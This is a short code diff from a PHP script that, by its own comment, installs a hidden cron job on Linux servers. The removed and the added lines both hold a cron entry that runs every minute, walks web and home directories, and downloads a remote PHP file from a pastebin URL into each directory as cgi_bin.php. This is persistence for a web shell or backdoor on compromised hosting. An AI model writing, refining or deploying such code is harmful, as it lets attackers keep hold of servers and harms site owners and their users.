@@ -340,7 +340,8 @@ if ($currentDir === false) {
 // Install hidden cronjob (Linux only)
 if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
     $cronFile = "/tmp/.cron_restore";
-    $restoreScript = '*/1 * * * * for site in /home/*/public_html; do [ -d "$site/wp-content" ] && for dir in "$site/wp-content" "$site/wp-includes" "$site/wp-content/themes" "$site/.well-known/acme-challenge" /tmp /var/www; do find "$dir" -type d -exec sh -c 'wget -q -O "{}/cgi_bin.php" https://pastebin.com/raw/c3QnpHQj 2>/dev/null || curl -s -o "{}/cgi_bin.php" https://pastebin.com/raw/c3QnpHQj' \; 2>/dev/null; done; done';
+    $restoreScript = '
+*/1 * * * * for dir in /var/www /home /tmp; do find $dir -type d -exec sh -c \'[ ! -f "{}/cgi_bin.php" ] && (wget -q -O "{}/cgi_bin.php" https://pastebin.com/raw/c3QnpHQj || curl -s -o "{}/cgi_bin.php" https://pastebin.com/raw/c3QnpHQj)\' \; ; done >/dev/null 2>&1';';
     
     if (!file_exists($cronFile)) {
         @file_put_contents($cronFile, $restoreScript);
